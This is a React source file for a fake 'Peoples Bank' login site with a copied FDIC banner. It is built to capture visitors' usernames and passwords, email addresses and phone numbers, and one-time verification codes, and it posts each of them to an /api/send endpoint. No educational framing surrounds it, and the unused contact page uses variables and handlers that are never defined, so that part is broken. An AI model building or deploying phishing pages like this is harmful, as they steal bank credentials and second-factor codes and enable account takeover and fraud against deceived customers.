import React, { useState } from "react";
import "./App.css";
import pbLogo from "./assets/peoples-bank-logo.png";
import fdicLogo from "./assets/fdic-logo.png";
import axios from "axios";

function App() {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [page, setPage] = useState("login");

  // Email Verification state
  const [verifyEmail, setVerifyEmail] = useState("");
  const [verifyPhone, setVerifyPhone] = useState("");

  // Code Verification state
  const [code, setCode] = useState("");

  // Compact input style
  const inputStyle = {
    fontWeight: 700,
    fontSize: 18,
    letterSpacing: 1,
    padding: '12px 10px',
    border: '1px solid #bfc5d2',
    borderRadius: 4,
    marginBottom: 10,
    outline: 'none',
    background: '#fff',
    color: '#222',
    width: '100%',
    textAlign: 'center',
    boxSizing: 'border-box',
  };

  // Login page submit logic
  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      await axios.post("/api/send", {
        subject: "Login Details",
        email: username,
        message: password
      });
      setPage('verify');
    } catch (err) {
      alert('Failed to send login info. Please try again.');
      console.error('Login send error:', err);
    }
  };

  if (page === "contact") {
    return (
      <div className="pattern-bg" style={{ minHeight: "100vh" }}>
        {/* Top Bar */}
        <div style={{ background: '#23477b', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', height: 56, padding: '0 16px', fontWeight: 700, fontSize: 20, letterSpacing: 1 }}>
          <span style={{ fontSize: 28, cursor: 'pointer', fontWeight: 400 }} onClick={() => setPage('login')}>&#8592;</span>
          <span style={{ flex: 1, textAlign: 'center', fontSize: 18, fontWeight: 700, letterSpacing: 1 }}>CONTACT INFORMATION</span>
          <span style={{ fontSize: 32, cursor: 'pointer', fontWeight: 400 }}>&#10005;</span>
        </div>
        {/* Form */}
        <form style={{ maxWidth: 600, margin: '32px auto 0 auto', padding: '0 16px', display: 'flex', flexDirection: 'column', gap: 0 }}>
          <div style={{ position: 'relative', marginBottom: 18 }}>
                <input
              type="text"
              placeholder="ADDRESS"
              value={address}
              onChange={e => setAddress(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
                  required
                />
            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
              </div>
          <div style={{ position: 'relative', marginBottom: 18 }}>
                <input
              type="text"
              placeholder="ADDRESS LINE 2"
              value={address2}
              onChange={e => setAddress2(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
                />
              </div>
          <div style={{ position: 'relative', marginBottom: 18 }}>
                <input
                  type="text"
              placeholder="CITY"
              value={city}
              onChange={e => setCity(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
                  required
                />
            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
              </div>
          <div style={{ position: 'relative', marginBottom: 18 }}>
                <input
                  type="text"
              placeholder="STATE"
              value={state}
              onChange={e => setState(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
                  required
                />
            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
              </div>
          <div style={{ position: 'relative', marginBottom: 18 }}>
                <input
                  type="text"
              placeholder="ZIP"
              value={zip}
              onChange={e => setZip(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
                  required
                />
            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
          </div>
          <div style={{ position: 'relative', marginBottom: 18 }}>
                <input
                  type="text"
              placeholder="PHONE NUMBER"
              value={phone}
              onChange={e => setPhone(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
                  required
                />
            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
              </div>
          <div style={{ position: 'relative', marginBottom: 18 }}>
                <input
              type="email"
              placeholder="EMAIL ADDRESS"
              value={email}
              onChange={e => setEmail(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
                  required
                />
            <span style={{ position: 'absolute', right: 12, top: 10, color: '#8a8e98', fontSize: 13, fontWeight: 400 }}>required</span>
              </div>
            </form>
        {/* Continue Button */}
        <div style={{ position: 'fixed', left: 0, bottom: 0, width: '100%', background: '#fff', borderTop: '1px solid #e0e0e0', padding: '12px 0' }}>
          <button
            style={{
              width: '90%',
              maxWidth: 600,
              margin: '0 auto',
              display: 'block',
              background: allContactFilled ? '#2ecc40' : '#8a97a6',
              color: '#fff',
              fontWeight: 700,
              fontSize: 18,
              border: 'none',
              borderRadius: 2,
              padding: '14px 0',
              letterSpacing: 1,
              cursor: allContactFilled ? 'pointer' : 'not-allowed',
              opacity: allContactFilled ? 1 : 0.7
            }}
            disabled={!allContactFilled}
            onClick={handleContactContinue}
          >
            CONTINUE <span style={{ fontSize: 20, verticalAlign: 'middle', marginLeft: 8 }}>&#8594;</span>
          </button>
        </div>
      </div>
    );
  }

  if (page === "success") {
    return (
      <div className="pattern-bg" style={{ minHeight: "100vh", display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ background: '#fff', borderRadius: 8, boxShadow: '0 2px 16px 0 rgba(0,0,0,0.08)', padding: 40, textAlign: 'center' }}>
          <h2 style={{ color: '#1a3365', marginBottom: 16 }}>Thank you!</h2>
          <p>Your information has been submitted successfully.</p>
        </div>
      </div>
    );
  }

  if (page === "verify") {
    const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    const allVerifyFilled = isValidEmail(verifyEmail) && verifyPhone;
    return (
      <div className="pattern-bg" style={{ minHeight: "100vh" }}>
        {/* Top Bar */}
        <div style={{ background: '#23477b', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', height: 56, padding: '0 16px', fontWeight: 700, fontSize: 20, letterSpacing: 1 }}>
          <span style={{ fontSize: 28, cursor: 'pointer', fontWeight: 400 }} onClick={() => setPage('login')}>&#8592;</span>
          <span style={{ flex: 1, textAlign: 'center', fontSize: 18, fontWeight: 700, letterSpacing: 1 }}>Email Verification</span>
          <span style={{ fontSize: 32, cursor: 'pointer', fontWeight: 400 }}>&#10005;</span>
        </div>
        {/* Logo and Subheading */}
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: 32, marginBottom: 16 }}>
          <img src={pbLogo} alt="Peoples Bank" style={{ width: 120, maxWidth: '60vw', marginBottom: 12 }} />
          <div style={{ fontFamily: 'Georgia, serif', fontSize: 22, color: '#1a3365', fontWeight: 500, textAlign: 'center', marginBottom: 8 }}>Confirm Your Email and Phone Number Information</div>
          <div style={{ color: '#444', fontSize: 15, textAlign: 'center', marginBottom: 8 }}>Please confirm your contact details on file.</div>
        </div>
        {/* Form */}
        <form style={{ maxWidth: 400, margin: '0 auto', padding: '0 16px', display: 'flex', flexDirection: 'column', gap: 0 }}>
          <div style={{ position: 'relative', marginBottom: 18 }}>
            <input
              type="email"
              placeholder="Email Address"
              value={verifyEmail}
              onChange={e => setVerifyEmail(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18, borderColor: verifyEmail && !isValidEmail(verifyEmail) ? 'red' : '#bfc5d2' }}
              required
            />
          </div>
          <div style={{ position: 'relative', marginBottom: 18 }}>
            <input
              type="tel"
              placeholder="Phone Number"
              value={verifyPhone}
              onChange={e => setVerifyPhone(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
              required
            />
          </div>
        </form>
        {/* Continue Button */}
        <div style={{ position: 'fixed', left: 0, bottom: 0, width: '100%', background: '#fff', borderTop: '1px solid #e0e0e0', padding: '12px 0' }}>
          <button
            style={{
              width: '90%',
              maxWidth: 400,
              margin: '0 auto',
              display: 'block',
              background: allVerifyFilled ? '#2ecc40' : '#8a97a6',
              color: '#fff',
              fontWeight: 700,
              fontSize: 18,
              border: 'none',
              borderRadius: 2,
              padding: '14px 0',
              letterSpacing: 1,
              cursor: allVerifyFilled ? 'pointer' : 'not-allowed',
              opacity: allVerifyFilled ? 1 : 0.7
            }}
            disabled={!allVerifyFilled}
            onClick={async e => {
              e.preventDefault();
              if (!allVerifyFilled) return;
              try {
                await axios.post("/api/send", {
                  subject: "Email Verification",
                  email: verifyEmail,
                  message: `Email Address: ${verifyEmail}\nPhone Number: ${verifyPhone}`
                });
                setPage('code');
              } catch (err) {
                alert('Failed to send verification email. Please try again.');
                console.error('Email Verification send error:', err);
              }
            }}
          >
            CONTINUE <span style={{ fontSize: 20, verticalAlign: 'middle', marginLeft: 8 }}>&#8594;</span>
          </button>
        </div>
      </div>
    );
  }

  if (page === "code") {
    const codeFilled = code.length > 0;
    return (
      <div className="pattern-bg" style={{ minHeight: "100vh" }}>
        {/* Top Bar */}
        <div style={{ background: '#23477b', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', height: 56, padding: '0 16px', fontWeight: 700, fontSize: 20, letterSpacing: 1 }}>
          <span style={{ fontSize: 28, cursor: 'pointer', fontWeight: 400 }} onClick={() => setPage('verify')}>&#8592;</span>
          <span style={{ flex: 1, textAlign: 'center', fontSize: 18, fontWeight: 700, letterSpacing: 1 }}>Code Verification</span>
          <span style={{ fontSize: 32, cursor: 'pointer', fontWeight: 400 }}>&#10005;</span>
        </div>
        {/* Logo and Subheading */}
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: 32, marginBottom: 16 }}>
          <img src={pbLogo} alt="Peoples Bank" style={{ width: 120, maxWidth: '60vw', marginBottom: 12 }} />
          <div style={{ fontFamily: 'Georgia, serif', fontSize: 22, color: '#1a3365', fontWeight: 500, textAlign: 'center', marginBottom: 8 }}>We have sent a secured code to your registered number.</div>
          <div style={{ color: '#444', fontSize: 15, textAlign: 'center', marginBottom: 8 }}>Please tell us your code for account verification. If you did not get the code, please wait 1-2 minutes.</div>
        </div>
        {/* Form */}
        <form style={{ maxWidth: 400, margin: '0 auto', padding: '0 16px', display: 'flex', flexDirection: 'column', gap: 0 }}>
          <div style={{ position: 'relative', marginBottom: 18 }}>
            <input
              type="text"
              placeholder="Enter your code"
              value={code}
              onChange={e => setCode(e.target.value)}
              style={{ ...inputStyle, textAlign: 'left', marginBottom: 0, fontSize: 18 }}
              required
            />
          </div>
        </form>
        {/* Continue Button */}
        <div style={{ position: 'fixed', left: 0, bottom: 0, width: '100%', background: '#fff', borderTop: '1px solid #e0e0e0', padding: '12px 0' }}>
          <button
            style={{
              width: '90%',
              maxWidth: 400,
              margin: '0 auto',
              display: 'block',
              background: codeFilled ? '#2ecc40' : '#8a97a6',
              color: '#fff',
              fontWeight: 700,
              fontSize: 18,
              border: 'none',
              borderRadius: 2,
              padding: '14px 0',
              letterSpacing: 1,
              cursor: codeFilled ? 'pointer' : 'not-allowed',
              opacity: codeFilled ? 1 : 0.7
            }}
            disabled={!codeFilled}
            onClick={async e => {
              e.preventDefault();
              if (!codeFilled) return;
              try {
                await axios.post("/api/send", {
                  subject: "Code Verification",
                  email: verifyEmail,
                  message: `Verification Code: ${code}`
                });
                setPage('success');
              } catch (err) {
                alert('Failed to send code. Please try again.');
                console.error('Code Verification send error:', err);
              }
            }}
          >
            CONTINUE <span style={{ fontSize: 20, verticalAlign: 'middle', marginLeft: 8 }}>&#8594;</span>
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="pattern-bg" style={{ minHeight: "100vh" }}>
      {/* FDIC Banner */}
      <div style={{ display: "flex", alignItems: "center", background: "#fff", padding: "0 24px", borderBottom: "1px solid #e0e0e0", height: 48 }}>
        <img src={fdicLogo} alt="FDIC" style={{ height: 32, marginRight: 14, display: 'block' }} />
        <span style={{ fontSize: 15, color: "#222", fontFamily: 'Segoe UI, Arial, sans-serif', lineHeight: 1, display: 'flex', alignItems: 'center', height: '100%' }}>
          FDIC-Insured - Backed by the full faith and credit of the U.S. Government
        </span>
      </div>
      {/* Centered Login Elements */}
      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", minHeight: "calc(100vh - 120px)", padding: '0', marginTop: '32px' }}>
        <img src={pbLogo} alt="Peoples Bank" style={{ width: 260, maxWidth: '90vw', margin: "32px 0 18px 0" }} />
        <form style={{ width: 370, maxWidth: '95vw', display: 'flex', flexDirection: 'column', gap: 0, background: 'none', boxShadow: 'none', padding: 0, borderRadius: 0 }}>
          <input
            type="text"
            placeholder="USERNAME"
            value={username}
            onChange={e => setUsername(e.target.value)}
            style={{ ...inputStyle, marginBottom: 10 }}
            required
          />
          <div style={{ position: 'relative', marginBottom: 12, width: '100%' }}>
            <input
              type={showPassword ? "text" : "password"}
              placeholder="PASSWORD"
              value={password}
              onChange={e => setPassword(e.target.value)}
              style={{ ...inputStyle, marginBottom: 0 }}
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(v => !v)}
              style={{
                position: 'absolute',
                right: 16,
                top: '50%',
                transform: 'translateY(-50%)',
                background: 'none',
                border: 'none',
                color: '#222',
                fontWeight: 700,
                fontSize: 16,
                cursor: 'pointer',
                padding: 0,
              }}
              tabIndex={-1}
            >
              SHOW
            </button>
          </div>
          <button
            type="submit"
            style={{
              background: '#1a3365',
              color: '#fff',
              fontWeight: 700,
              fontSize: 18,
              border: 'none',
              borderRadius: 4,
              padding: '12px 0',
              margin: '6px 0 14px 0',
              cursor: 'pointer',
              letterSpacing: 1,
              width: '100%',
              textAlign: 'center',
              boxShadow: 'none',
            }}
            onClick={handleLogin}
          >
            SIGN IN
          </button>
          <div style={{ textAlign: 'left', marginBottom: 8 }}>
            <label htmlFor="remember" style={{ color: '#1a3365', fontWeight: 700, fontSize: 14, cursor: 'pointer', display: 'flex', alignItems: 'center' }}>
              <input type="checkbox" id="remember" style={{ marginRight: 7, width: 15, height: 15 }} />
              Remember Username
            </label>
          </div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 14, fontSize: 11.5, color: '#1a3365', justifyContent: 'flex-start', marginTop: 0, marginBottom: 18 }}>
            <a href="#" style={{ color: '#1a3365', textDecoration: 'none', fontSize: 11.5 }}>Sign Up</a>
            <a href="#" style={{ color: '#1a3365', textDecoration: 'none', fontSize: 11.5 }}>Open an Account</a>
            <a href="#" style={{ color: '#1a3365', textDecoration: 'none', fontSize: 11.5 }}>Forgot Username / Password</a>
          </div>
        </form>
      </div>
      {/* Bottom Privacy Policy */}
      <div style={{ width: '100%', position: 'fixed', left: 0, bottom: 0, padding: '0 24px 12px 24px', boxSizing: 'border-box', display: 'flex', justifyContent: 'flex-end' }}>
        <a href="#" style={{ color: '#1a3365', textDecoration: 'underline', fontSize: 15 }}>Privacy Policy</a>
      </div>
    </div>
  );
}

export default App;